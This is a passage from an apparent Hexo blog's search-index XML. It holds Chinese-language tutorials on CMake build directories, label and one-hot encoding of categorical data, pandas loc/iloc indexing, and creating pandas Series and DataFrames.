build.make</span><br><span class="line">│   │   │   ├── cmake_clean.cmake</span><br><span class="line">│   │   │   ├── DependInfo.cmake</span><br><span class="line">│   │   │   ├── depend.make</span><br><span class="line">│   │   │   ├── flags.make</span><br><span class="line">│   │   │   ├── link.txt</span><br><span class="line">│   │   │   └── progress.make</span><br><span class="line">│   │   ├── Makefile2</span><br><span class="line">│   │   ├── Makefile.cmake</span><br><span class="line">│   │   ├── progress.marks</span><br><span class="line">│   │   └── TargetDirectories.txt</span><br><span class="line">│   ├── cmake_install.cmake</span><br><span class="line">│   └── Makefile</span><br><span class="line">├── CMakeLists.txt</span><br><span class="line">├── main.cpp</span><br></pre></td></tr></table></figure><p>build 文件夹下生成了许多二进制文件，如果要从头开始重新创建 cmake环境，只需删除构建目录 build，然后重新运行 cmake 即可。</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://seisman.github.io/how-to-write-makefile/introduction.html">makefile介绍 — 跟我一起写 Makefile 1.0 文档</a></li><li><ahref="https://stackoverflow.com/questions/2057689/how-does-make-app-know-default-target-to-build-if-no-target-is-specified">makefile- How does "make" app know default target to build if no target isspecified? - Stack Overflow</a></li><li><ahref="https://www.linuxidc.com/Linux/2019-08/160139.htm#:~:text=%E7%AE%80%E5%8D%95%E6%9D%A5%E8%AF%B4%EF%BC%8Cmake%20%E6%98%AF%E7%BC%96%E8%AF%91%EF%BC%8Cmake%20install%20%E6%98%AF%E5%AE%89%E8%A3%85%E3%80%82">make和 make install 的区别_Linux 教程_Linux 公社-Linux 系统门户网站</a></li><li><a href="https://www.jianshu.com/p/5c9ffb3506c0">想玩儿 github开源，怎能对 make、cmake 一知半解？ - 简书</a></li><li><ahref="https://xkun.me/2021/09/02/Makefile%E5%B0%86%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95/">Makefile将目标文件输出到指定目录 | Snow's Blog</a></li><li><ahref="https://sfumecjf.github.io/cmake-examples-Chinese/01-basic/1.1%20%20hello-cmake.html">1.1hello-CMake · GitBook</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> cplusplus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMake </tag>
            
            <tag> Make </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Categorical encoding:Label-Encoding and One-Hot-Encoder</title>
      <link href="/blog/2022/05/19/ml/categorical_encoding/"/>
      <url>/blog/2022/05/19/ml/categorical_encoding/</url>
      
        <content type="html"><![CDATA[<p>在机器学习或大数据中，数据集可能包含文本或类别值(categorical values),基本上是非数值值 (non-numerical values), 例如：颜色：red, orange, blue,white 等、饮食：breakfast, lunch, snacks, dinner, tea。一些算法，比如CATBOAST，decision-trees 可以很好地处理类别值（categoricalvalues），但大多数算法更偏向使用数值，它们在数值输入时更容易获得state-of-the-artresults。因此我们需要将文本/类别数据转换为数值数据，并仍然使算法/模型从其中习得含义。</p><p>有许多将分类值转换为数值的方法，每种方法都有其优缺点。本文主要介绍两种主流的编码方案:One-Hot-Encoding and Label-Encoding. 这两种编码都可用 pandas 或SciKit-learn 实现。</p><h2 id="label-encoding">Label Encoding</h2><p>将每个类别转化为一个数字 对如下类别值进行 Label Encoding编码如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BRIDGE-TYPE</span><br><span class="line">Arch</span><br><span class="line">Beam</span><br><span class="line">Truss</span><br><span class="line">Cantilever</span><br><span class="line">Tied Arch</span><br><span class="line">Suspension</span><br><span class="line">Cable</span><br></pre></td></tr></table></figure><p>Label Encoding: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220501230259.png"alt="20220501230259" /></p><h3 id="问题与局限">问题与局限</h3><p>由于 Label Encoding使用数字序列编码，导致其在原始数据之间引入了关联/比较。很明显在桥的类型没有任何关系。但是从编码角度看，可能会认为Truess 比 Arch优先级/次序高。该算法可能会误解数据具有某种层次结构/次序:0 &lt;1&lt;2…&lt;6，并且可能对 Truess 给予多于六倍的 Arch 的权重</p><p>而有些类别，诸如：Safety Level这类具备优先级/次序的类别值，就可以使用 Labelencoding，来标识出其关系。如果算法将 Safety Level 编码解释为: 0 &lt; 1&lt; 2 &lt; 3 &lt; 4，即 none &lt; low &lt; medium &lt; high &lt; veryhigh, 便是有意义的。</p><p>none &lt; low &lt; medium &lt; high &lt; very high</p><h3 id="label-encoding-in-python">Label Encoding in Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import required libraries</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># creating initial dataframe</span></span><br><span class="line">bridge_types = (<span class="string">&#x27;Arch&#x27;</span>,<span class="string">&#x27;Beam&#x27;</span>,<span class="string">&#x27;Truss&#x27;</span>,<span class="string">&#x27;Cantilever&#x27;</span>,<span class="string">&#x27;Tied Arch&#x27;</span>,<span class="string">&#x27;Suspension&#x27;</span>,<span class="string">&#x27;Cable&#x27;</span>)</span><br><span class="line">bridge_df = pd.DataFrame(bridge_types, columns=[<span class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># converting type of columns to &#x27;category&#x27;</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>] = bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>].astype(<span class="string">&#x27;category&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assigning numerical values and storing in another column</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types_Cat&#x27;</span>] = bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>].cat.codes</span><br><span class="line">bridge_df</span><br></pre></td></tr></table></figure><p>代码提示：</p><ol type="1"><li>默认情况下，非数值型列是 "object" 类型，该方法要求类别列是"category" 类型，pandas 通过 astype 方法进行类型转换。</li><li>pandas.Series.cat 是 Accessor object for categorical properties ofthe Series values，返回一个 Categoricals 类型。Categoricals 类型有categories 和 codes 属性，分别表示数据存储时的分类和编码，用法:pandas.Categorical.categories 与 pandas.Categorical.code。</li></ol><h2 id="using-sci-kit-learn-library-approach">Using sci-kit learnlibrary approach</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"><span class="comment"># creating initial dataframe</span></span><br><span class="line">bridge_types = (<span class="string">&#x27;Arch&#x27;</span>,<span class="string">&#x27;Beam&#x27;</span>,<span class="string">&#x27;Truss&#x27;</span>,<span class="string">&#x27;Cantilever&#x27;</span>,<span class="string">&#x27;Tied Arch&#x27;</span>,<span class="string">&#x27;Suspension&#x27;</span>,<span class="string">&#x27;Cable&#x27;</span>)</span><br><span class="line">bridge_df = pd.DataFrame(bridge_types, columns=[<span class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># creating instance of labelencoder</span></span><br><span class="line">labelencoder = LabelEncoder()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assigning numerical values and storing in another column</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types_Cat&#x27;</span>] = labelencoder.fit_transform(bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line">bridge_df</span><br></pre></td></tr></table></figure><p>结果： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220501233614.png"alt="bridge_df with categorical caolumn and label-encoded column values" /></p><h2 id="one-hot-encoding">One-Hot encoding</h2><p>Encoding is a required pre-processing step when working withcategorical data for machine learning algorithms. How to use ordinalencoding for categorical variables that have a natural rank ordering.How to use one-hot encoding for categorical variables that do not have anatural rank ordering.</p><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="https://towardsdatascience.com/categorical-encoding-using-label-encoding-and-one-hot-encoder-911ef77fb5bd">Categoricalencoding using Label-Encoding and One-Hot-Encoder | by Dinesh Yadav |Towards Data Science</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas 中的索引与选择</title>
      <link href="/blog/2022/05/19/ml/index_select_assign/"/>
      <url>/blog/2022/05/19/ml/index_select_assign/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>尽管用来选择和设置操作的标准的 Python/Numpy表达式非常方便，但是官方推荐优化的 pandas 数据访问方法<code>.at</code>,<code>.iat</code>, <code>.loc</code>, <code>.iloc</code>。</p><p>Pandas 的数据基础索引方式主要分为两种： Index-basedselection（index,<code>iat</code>, <code>iloc</code>），Label-basedselection（column, <code>at</code>,<code>loc</code>）、，第三种是条件索引 Conditional indexing/Booleanindexing，即前两种+布尔等式、不等式实现条件索引。</p><p><code>loc</code>和<code>iloc</code>的异同（看不懂没关系，后面会讲）：</p><ol type="1"><li><p><code>loc</code> 和 <code>iloc</code> 都是row-first，column-second,这意味取 row 比取 column 容易</p></li><li><p>区间开闭</p><p><code>iloc</code> 是常见的前闭后开 [a, b)， 而<code>loc[a:b]</code><strong>闭区间[a, b]</strong></p></li></ol><h2 id="start">Start</h2><ol type="1"><li><p>选择单独的一列，会生成 Series，相当于 <code>df.A</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [8]: product</span><br><span class="line">Out[8]:</span><br><span class="line">Product A  Product B  Product C</span><br><span class="line">1         30         21          9</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br><span class="line">4         43         12         75</span><br><span class="line">5         65         19         68</span><br><span class="line">6         13         10         32</span><br><span class="line"></span><br><span class="line">In [9]: product[&quot;Product A&quot;]</span><br><span class="line">Out[9]:</span><br><span class="line">1    30</span><br><span class="line">2    35</span><br><span class="line">3    41</span><br><span class="line">4    43</span><br><span class="line">5    65</span><br><span class="line">6    13</span><br><span class="line">Name: Product A, dtype: int64</span><br></pre></td></tr></table></figure></p></li><li><p>通过 <code>[]</code>,可以对 row 切片：</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [10]: product[1:3]</span><br><span class="line">Out[10]:</span><br><span class="line">Product A  Product B  Product C</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="index-based-selection">Index-based selection</h2><p>无论对于那种 selection, index 都是 numerical 的，区别在于 column 是numerical 的，还是 label。</p><p><code>iloc</code>operator ：index-based selection: selecting databased on its numerical position in the data. <code>iloc</code> followsthis paradigm。</p><p>注意：</p><ol type="1"><li>对于 <code>iloc</code> 而言，取列就需要提供列的 numericindexers，提供 column label 便会报错。</li><li>索引切片的规则都可以使用：前闭后开的范围[),负索引 -1，全索引：。</li></ol><p>示例（<code>df</code> 是读取了数据的名为 <code>df</code> 的DataFrame）：</p><ul><li>取倒数第一行：<code>df.iloc[-1]</code></li><li>取第一列：<code>df.iloc[:, 0]</code>, the <code>:</code> operator切片指所有元素。</li><li>取：<code>reviews.iloc[[0, 1, 2], 0]</code></li></ul><h3 id="label-based-selection">Label-based selection</h3><p><code>loc</code> operator: label-basedselection，对列进行索引的时候使用 label/索引的值，而不是索引。</p><p>示例：</p><p>取第一行 country 列：<code>df.loc[0, 'country']</code>取每一行的'taster_name', 'taster_twitter_handle','points'三列：<code>reviews.loc[:, ['taster_name', 'taster_twitter_handle', 'points']]</code></p><h2 id="loc-与-iloc-异同">loc 与 iloc 异同</h2><p><code>loc</code>和<code>iloc</code>的异同：</p><ol type="1"><li><p><code>loc</code> 和 <code>iloc</code> 都是row-first，column-second,这意味取 row 比取 column 容易</p></li><li><p>区间开闭 <code>iloc</code> uses the Python stdlib indexingscheme,所以是常见的前闭后开 [a, b)，<code>[1,3]</code>,则是<code>1 2</code> 两个元素。</p><p>而<code>loc[a:b]</code> 为闭区间[a, b]，<code>[1, 3]</code>,则是<code>1, 2, 3</code>三个元素。</p></li></ol><p>3.<code>iloc</code> 相比 <code>loc</code>多加的 <code>i</code>是即是针对列，也是针对行的，只不过 index label 比较少见。</p><pre><code>行一般只有 index，而 `loc`, `iloc` 对行的 index 都支持，因此都可。如果行有index label，可使用 `loc`。列两种：要使用 column number index 选择，用 `iloc`要使用 column labels 选择，用 `loc`</code></pre><ol start="4" type="1"><li><p><code>loc</code> 可以索引任何 stdlib type: strings</p><p>如果索引（默认就说行索引）的索引值为<code>Apples, ..., Potatoes, ...</code>，则可以岁该索引进行切片，<code>df.loc['Apples':'Potatoes']</code>:allthe alphabetical fruit choices between Apples andPotatoes.当然，此时食用</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [21]: df = pd.DataFrame(&#123;&#x27;Bob&#x27;: [&#x27;I liked it.&#x27;, &#x27;It was awful.&#x27;, &#x27;good.&#x27;, &#x27;very good&#x27;],</span><br><span class="line">    ...:                    &#x27;Sue&#x27;: [&#x27;Pretty good.&#x27;, &#x27;Bland.&#x27;, &#x27;Just so so&#x27;, &#x27;Bad.&#x27;]&#125;,</span><br><span class="line">    ...:                   index=[&#x27;Product A&#x27;, &#x27;Product B&#x27;, &quot;Product C&quot;,&quot;Product D&quot;])</span><br><span class="line">    ...: df.loc[&quot;Product B&quot;:&quot;Product C&quot;]</span><br><span class="line">Out[21]:</span><br><span class="line">                    Bob         Sue</span><br><span class="line">Product B  It was awful.      Bland.</span><br><span class="line">Product C          good.  Just so so</span><br><span class="line"></span><br><span class="line">...: df.iloc[1:3]</span><br><span class="line">Out[22]:</span><br><span class="line">                    Bob         Sue</span><br><span class="line">Product B  It was awful.      Bland.</span><br><span class="line">Product C          good.  Just so so</span><br></pre></td></tr></table></figure></p></li></ol><p><code>df.set_index("title")</code> 可以把 title 列设置成 label-basedindex</p><h2 id="conditional-selection">Conditional selection</h2><ol type="1"><li><p>reviews 的 country列是否等于'Italy'：<code>reviews.country == 'Italy'</code> 返回 a Seriesof True/False booleans based on the country of each record.</p></li><li><p>使用位与、位或操作符在两个 bool 表达式之间</p></li></ol><p><code>reviews.loc[(reviews.country == 'Italy') &amp; (reviews.points &gt;= 90)]</code><code>reviews.loc[(reviews.country == 'Italy') | (reviews.points &gt;= 90)]</code></p><p>内置选择器：<code>isin</code>、<code>isnull</code>、<code>notnull</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reviews.loc[reviews.country.isin([&#x27;Italy&#x27;, &#x27;France&#x27;])]</span><br><span class="line">reviews.loc[reviews.price.notnull()]</span><br></pre></td></tr></table></figure><h2 id="赋值">赋值</h2><p>可以赋单个值，也可以赋一个序列值：</p><p><code>reviews['critic'] = 'everyone'</code>: 将 critic 列的值全部赋为everyone<code>reviews['index_backwards'] = range(len(reviews), 0, -1)</code>:为index_backwards 赋予一个逆序列值。</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://www.kaggle.com/code/residentmario/indexing-selecting-assigning#Manipulating-the-index">Indexing,Selecting &amp; Assigning | Kaggle</a></li><li><ahref="https://pandas.pydata.org/pandas-docs/stable/user_guide/10min.html#viewing-data">10minutes to pandas — pandas 1.4.2 documentation</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas 入门</title>
      <link href="/blog/2022/05/18/ml/pandas_intro/"/>
      <url>/blog/2022/05/18/ml/pandas_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="pandas-入门">Pandas 入门</h2><p>Pandas 中两个核心对象/数据结构：<code>DataFrame</code> 和<code>Series</code>，其中<code>DataFrame</code>为主要数据结构，它可以看做是<code>Series</code> 对象的类字典结构的容器。<code>Series</code>是数值的序列。<code>DataFrame</code> 是带有索引的 table-like数据结构，<code>Series</code> 是带有索引的 list-like数据结构，通过列表即可创 <code>Series</code>，而 <code>DataFrame</code>则需要二维的数据结构，如：字典，多维列表等创建。</p><p>安装：<code>pip install pandas</code>导入：<code>import pandas as pd</code></p><h2 id="series-创建">Series 创建</h2><p>一个 Series 实际上是 DataFrame 的一列，而一个 DataFrame实际上可以看做是由一系列 Series 组成。通过 index 参数可以对 Series的列的 row 索引（即：通过 index 指定 rowlabel），但是由于其只有一列，所以没有赋予 column label的意义与功。而是其有一个整体的名字，通过 <code>name</code> 赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 不带 index, 默认递增索引</span><br><span class="line">In [2]: a_list = [1,2,3]</span><br><span class="line">   ...: pd.Series(a_list)</span><br><span class="line">Out[2]:</span><br><span class="line">0    1</span><br><span class="line">1    2</span><br><span class="line">2    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line"># 带 index 索引 row</span><br><span class="line">In [3]: a_list = [1,2,3]</span><br><span class="line">   ...: pd.Series(a_list, index=[&quot;2016 Sales&quot;, &quot;2017 Sales&quot;, &quot;2018 Sales&quot;])</span><br><span class="line">Out[3]:</span><br><span class="line">2016 Sales    1</span><br><span class="line">2017 Sales    2</span><br><span class="line">2018 Sales    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line"># 带 index ，带 name</span><br><span class="line">In [7]: pd.Series(a_list, index=[&quot;2016 Sales&quot;, &quot;2017 Sales&quot;, &quot;2018 Sales&quot;], name=&quot;Production A&quot;)</span><br><span class="line">Out[7]:</span><br><span class="line">2016 Sales    1</span><br><span class="line">2017 Sales    2</span><br><span class="line">2018 Sales    3</span><br><span class="line">Name: Production A, dtype: int64</span><br></pre></td></tr></table></figure><h2 id="dataframe-的创建">DataFrame 的创建</h2><p><code>class pandas.DataFrame(data=None, index=None, columns=None, dtype=None, copy=None)</code>Two-dimensional, size-mutable, potentially heterogeneous tabular data二维的数据结构，大小可变，可以容纳异构数据</p><blockquote><ul><li><p>data: ndarray (structured or homogeneous), Iterable, dict, orDataFrame Dict can contain Series, arrays, constants, dataclass orlist-like objects. If data is a dict, column order followsinsertion-order. If a dict contains Series which have an index defined,it is aligned by its index.</p></li><li><p>index: The index (row labels) of the DataFrame.</p></li><li><p>columns: The column labels of the DataFrame.</p></li><li><p>dtype: Data type to force. Only a single dtype is allowed. IfNone, infer.</p></li></ul></blockquote><p>DataFrame 可以由很多数据结构创建而来，基础的分别有：Series,arrays,ndarray, constants, dataclass or list-like objects。</p><h3 id="由文件读取">由文件读取</h3><p>很多时候我们并不需要手动创建 DataFrame 或Series，而是读取操作现有的数据，常见数据格式有 CSV</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [6]: product = pd.read_csv(&quot;./data/product.csv&quot;)</span><br><span class="line"></span><br><span class="line">In [7]: product</span><br><span class="line">Out[7]:</span><br><span class="line">   Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32</span><br><span class="line"></span><br><span class="line">In [8]: product.shape</span><br><span class="line">Out[8]: (6, 4)</span><br></pre></td></tr></table></figure><p>当数据量较大的时候，可以使用 <code>head(), tail()</code>查看前五行或者后五行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [9]: product.head</span><br><span class="line">Out[9]:</span><br><span class="line">&lt;bound method NDFrame.head of    Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32&gt;</span><br><span class="line"></span><br><span class="line">In [11]: product.tail</span><br><span class="line">Out[11]:</span><br><span class="line">&lt;bound method NDFrame.tail of    Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32&gt;</span><br></pre></td></tr></table></figure><p>可以看到 pandas 会自动生成索引，如果希望 pandas使用某一列作为索引(而不是从头创建一个新索引)，可以使用<code>index_col</code> 指定猎德使用第 0 行作为索引。</p><blockquote><p><code>index_col</code>: int, str, sequence of int / str, or False,optional, default None Column(s) to use as the row labels of the<code>DataFrame</code>, <strong>either given as string name or columnindex</strong>.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [12]: product = pd.read_csv(&quot;./data/product.csv&quot;, index_col=0)</span><br><span class="line"></span><br><span class="line">In [13]: product</span><br><span class="line">Out[13]:</span><br><span class="line">   Product A  Product B  Product C</span><br><span class="line">1         30         21          9</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br><span class="line">4         43         12         75</span><br><span class="line">5         65         19         68</span><br><span class="line">6         13         10         32</span><br></pre></td></tr></table></figure><h3 id="向文件写入">向文件写入</h3><p><code>DataFrame.to_csv(file_name, sep=',', encoding='utf-8', index=)</code></p><p>将 DataFrame 对象写入逗号分隔的 CSV 文件中, file_name必选参数，其余可选。</p><blockquote><p><code>sep=','</code>: 默认输出文件以逗号分隔符,可以自行修改。<code>encoding='utf-8'</code>: 默认输出文件编码为 utf-8，可自行修改<code>index=True</code>: 默认将索引也写入文件，可以设置为 False不写入索引。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animals = pd.DataFrame(&#123;&#x27;Cows&#x27;: [12, 20], &#x27;Goats&#x27;: [22, 19]&#125;, index=[&#x27;Year 1&#x27;, &#x27;Year 2&#x27;])</span><br><span class="line">animals.to_csv(&quot;cows_and_goats.csv&quot;)</span><br></pre></td></tr></table></figure><h3 id="由-dict-创建">由 Dict 创建</h3><p>由字典创建，将字典值赋给 columnlabels，默认对索引进行递增（row），可以使用 index 自定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 1. 无自定义 index，默认生成自然数作为索引</span><br><span class="line">In [2]: pd.DataFrame(&#123;&#x27;Yes&#x27;: [50, 21], &#x27;No&#x27;: [131, 2]&#125;)</span><br><span class="line">Out[2]:</span><br><span class="line">   Yes   No</span><br><span class="line">0   50  131</span><br><span class="line">1   21    2</span><br><span class="line"></span><br><span class="line"># 2. 自定义行</span><br><span class="line">In [3]: pd.DataFrame(&#123;&#x27;Bob&#x27;: [&#x27;I liked it.&#x27;, &#x27;It was awful.&#x27;],</span><br><span class="line">                &#x27;Sue&#x27;: [&#x27;Pretty good.&#x27;, &#x27;Bland.&#x27;]&#125;,</span><br><span class="line">                index=[&#x27;Product A&#x27;, &#x27;Product B&#x27;])</span><br><span class="line">Out[3]:</span><br><span class="line">                Bob           Sue</span><br><span class="line">Product A    I liked it.  Pretty good.</span><br><span class="line">Product B  It was awful.        Bland.</span><br></pre></td></tr></table></figure><h3 id="由包含-series-的-dict-创建">由包含 Series 的 Dict 创建</h3><p>前面说到 Series 可以看做带索引的 List-like 数据结构，于是包含 Series的 Dict 和一般的包含 List 的 Dict 都可以创建 DataFrame不足为奇。不同之处在于，Series是可以指定索引的，通过指定部分索引上的元素，可以实现部分指定元素，其余为缺失值，但此情况创建DataFrame 时，需要指定 index，否则会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [19]: d = &#123;&quot;col1&quot;:[1, 2, 3,4], &quot;col2&quot;:pd.Series([10,11], index=[1, 3])&#125;</span><br><span class="line"></span><br><span class="line">In [20]: pd.DataFrame(d, index=[0, 1, 2, 3])</span><br><span class="line">Out[20]:</span><br><span class="line">   col1  col2</span><br><span class="line">0     1   NaN</span><br><span class="line">1     2  10.0</span><br><span class="line">2     3   NaN</span><br><span class="line">3     4  11.0</span><br></pre></td></tr></table></figure><h2 id="由-numpy-ndarray-创建">由 numpy ndarray 创建</h2><p>通过 ndarray 创建与通过字典创建的 DataFrame 不同之处：</p><ol type="1"><li>字典每个键值对应的列表/Series 是一列，而 <strong>ndaaray二维数组，每个数组是一行，整个 DataFrame 和二维 ndarray结构一致。</strong>。</li><li>通过字典创建的 DataFrame 具有 column labels，不需要手动赋予，而numpy 的 ndarray 便是 index /row labels 和 column labels自动生成，因此均可以通过 <code>index</code> 赋予索引/rowlabels，也可以通过<code>columns</code> 赋予 column labels。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [22]: data = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])</span><br><span class="line"></span><br><span class="line">In [23]: df2 = pd.DataFrame(data, columns=[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;])</span><br><span class="line"></span><br><span class="line">In [24]: df2</span><br><span class="line">Out[24]:</span><br><span class="line">   a  b  c</span><br><span class="line">0  1  2  3</span><br><span class="line">1  4  5  6</span><br><span 